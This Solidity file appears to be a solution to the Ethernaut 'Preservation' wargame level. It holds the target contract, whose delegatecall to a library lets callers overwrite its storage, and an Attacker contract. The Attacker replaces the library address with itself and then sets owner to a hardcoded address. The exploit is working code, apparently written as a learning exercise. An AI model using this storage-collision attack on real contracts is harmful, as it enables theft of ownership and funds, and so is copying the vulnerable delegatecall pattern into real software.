// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Preservation {

  // public library contracts 
  address public timeZone1Library; // SLOT 0
  address public timeZone2Library; // SLOT 1
  address public owner;            // SLOT 2
  uint storedTime;                 // SLOT 3
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

contract Attacker {
    address public timeZone1Library; // SLOT 0
    address public timeZone2Library; // SLOT 1
    address public owner;            // SLOT 2
    uint storedTime;                 // SLOT 3

    function attack() public {
        // address victim = 0xf8e81D47203A594245E36C48e151709F0C19fBe8; // fake
        address victim = 0x0D71E8A441B91F7A0C95f07c7d200Ca7e4a541Bd;    // real
        Preservation(victim).setFirstTime(uint(uint160(address(this))));
        Preservation(victim).setFirstTime(1);
    }

    function setTime(uint _time) public {
        owner = 0xEc87686f18DeCFf388198570058C94E55E384cBC;     // real
        // owner = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;  // fake
    }
}